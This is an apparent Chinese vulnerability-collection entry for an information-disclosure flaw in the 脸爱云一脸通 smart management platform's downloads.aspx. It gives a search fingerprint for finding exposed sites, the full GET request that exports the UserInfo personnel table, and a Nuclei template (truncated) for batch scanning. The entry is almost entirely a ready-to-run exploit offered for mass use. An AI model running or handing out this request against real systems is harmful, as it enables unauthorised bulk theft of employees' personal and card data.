# 脸爱云一脸通智慧平台downloads.aspx信息泄露漏洞

- **系统**：脸爱云一脸通智慧平台downloads.aspx　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="View/UserReserved/UserReservedTest.aspx"`
- **请求**：`GET /downloads.aspx?Ename=UserInfo&total=1000&jsonParam={%22rybh%22:%22%22,%22ryxm%22:%22%22,%22EngName%22:%22%22,%22groupname%22:%22%22,%22companyname%22:%22%22,%22bmmc%22:%22%22,%22ryzt%22:%22%22,%22rzstartime%22:%22%22,%22rzendtime%22:%22%22,%22lzstartime%22:%22%22,%22lzendtime%22:%22%22,%22zhiwu`
- **关键头**：`Host: {{Hostname}}`

**请求体 / payload**
```
Nuclei批量检测-文件名保存为yaml即可：
id: POC-Jocat-layun-downloads-UserInfo-leak
info:
name: 脸爱云一脸通智慧管理平台downloads.aspx信息泄露漏洞
author: HackTwo
severity: medium
http:
- raw:
-
GET /downloads.aspx?Ename=UserInfo&total=100&jsonParam={%22rybh%22:%22%22,%22ryxm%22:%22%22,%22EngName%22:%22%22,%22groupname%22:%22%22,%22companyname%22:%22%22,%22bmmc%22:%22%22,%22ryzt%22:%22%22,%22rzstartime%22:%22%22,%22rzendtime%22:%22%22,%22lzstartime%22:%22%22,%22lzendtime%22:%22%22,%22zhiwu%22:%22%22,%22cardid%22:%22%22,%22rfzt%22:%22%22,%22klb%22:%22%22,%22sxstartime%22:%22%22,%22sxendtime%22:%22%22,%22khstartime%22:%22%22,%2…（脚本共 855 字，完整版见原文）
```